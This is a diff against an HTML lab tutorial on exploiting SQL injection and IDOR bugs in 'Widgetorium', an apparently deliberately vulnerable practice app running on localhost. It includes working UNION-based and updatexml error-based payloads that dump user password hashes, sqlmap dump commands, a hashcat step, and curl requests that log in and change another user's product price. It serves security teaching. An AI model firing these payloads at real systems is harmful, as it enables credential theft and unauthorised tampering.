@@ -11,8 +11,9 @@
 <p>Goal for this session: exploit all four of Widgetorium's SQL injection bugs and understand why they are four separate bugs and not one. Two of them a scanner hands you. One of them a scanner will never find. One of them is really two bugs sharing an endpoint. By the end you will have the admin's password hash and a file read off the database host.</p>
 <p>Work every one of these by hand first. Break the query with a single quote and read the error. Count the columns with <code>ORDER BY</code> until it fails. Line up the <code>UNION</code> yourself. Only once you have exploited the point manually do you hand the same parameter to sqlmap, and the point of running sqlmap then is to see how it automates the enumeration you just did by hand, not to have it find the bug for you.</p>
 <h2>3.1 The Search Box: UNION-Based, Reads Any Table</h2>
-<p>Start with a broken quote and read what comes back: <code>?q=%27</code> returns the raw failing query, which tells you the columns are <code>id, name, price</code>. Three columns, so a <code>UNION SELECT</code> of three lines up cleanly.</p>
-<pre>curl -s "http://127.0.0.1:8080/search.php?q=x' UNION SELECT username,password_hash,role FROM users-- -"</pre>
+<p>Start with a broken quote and read what comes back: <code>?q=%27</code> returns the raw failing query, which tells you the columns are <code>id, name, price</code>. Three columns, so a <code>UNION SELECT</code> of three lines up cleanly. Send it with <code>-G --data-urlencode</code> so the quote and the spaces survive the shell and end up in a well-formed request line; a raw <code>curl "...?q=x' UNION SELECT ..."</code> with literal spaces gets a <code>400</code> back and <code>-s</code> hides it.</p>
+<pre>curl -s -G "http://127.0.0.1:8080/search.php" \
+  --data-urlencode "q=x' UNION SELECT username,password_hash,role FROM users-- -"</pre>
 <p>The results table now lists every account and its unsalted MD5 hash. Now hand the same parameter to <code>sqlmap</code> and watch it work the problem systematically:</p>
 <pre>sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs
 sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users --dump</pre>
@@ -32,12 +33,17 @@ sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users
     FROM users ORDER BY id LIMIT 1)),1)-- -</pre>
 <p>The storefront still looks normal. Open <code>/admin/inventory_report.php</code> and that row's "on hand" cell reads:</p>
 <pre>(error) ... XPATH syntax error: '~admin:042af043eff3ad41868f9ccdf'</pre>
-<p>Walk <code>LIMIT 1,1</code>, <code>LIMIT 2,1</code> for the rest of the table. The teaching point: data already in your database is still untrusted input. Sanitising on the way in is not the same as parameterising the query that reads it back out.</p>
+<p>That hash is truncated. <code>updatexml</code> caps its error string at 32 characters and the <code>~admin:</code> prefix spent seven of them, so you have 25 of the 32 hex digits. Read the tail with a second product that windows past the prefix:</p>
+<pre>zz' AND updatexml(1,concat(0x7e,(SELECT MID(password_hash,20)
+    FROM users ORDER BY id LIMIT 1)),1)-- -</pre>
+<p>Overlap the two results on the digits they share to line them up, and you have the full 32-character MD5 for <code>hashcat -m 0</code>. Walk <code>LIMIT 1,1</code>, <code>LIMIT 2,1</code> for the other rows, windowing each one the same way. The teaching point: data already in your database is still untrusted input. Sanitising on the way in is not the same as parameterising the query that reads it back out.</p>
 <h2>3.4 The Price API: Injection and Broken Authorisation in One Endpoint</h2>
 <p>The <code>api/update_item.php</code> endpoint takes a JSON body of <code>{id, price, qty}</code> and updates a product. It has two independent bugs.</p>
 <h3>The authorisation half</h3>
-<p>Any logged-in user can call it. There is no check that the product belongs to the caller and no admin-role check. Log in as the customer <code>alice</code> and edit a product she does not own:</p>
-<pre>curl -s -b alice.jar -H 'Content-Type: application/json' \
+<p>Any logged-in user can call it. There is no check that the product belongs to the caller and no admin-role check. Log in as the customer <code>alice</code> (password <code>Password123</code>, handed to you by the recon in Session 2 and the crack in 3.1) and edit a product she does not own:</p>
+<pre>curl -s -c alice.jar -o /dev/null \
+     -d "username=alice&amp;password=Password123" http://127.0.0.1:8080/login.php
+curl -s -b alice.jar -H 'Content-Type: application/json' \
      -d '{"id":7,"price":0.01}' \
      http://127.0.0.1:8080/api/update_item.php</pre>
 <p>The response confirms the change and shows your role as <code>customer</code>. That is an IDOR: the object reference, <code>id</code>, is under your control and nothing checks whether you should be allowed to touch it.</p>
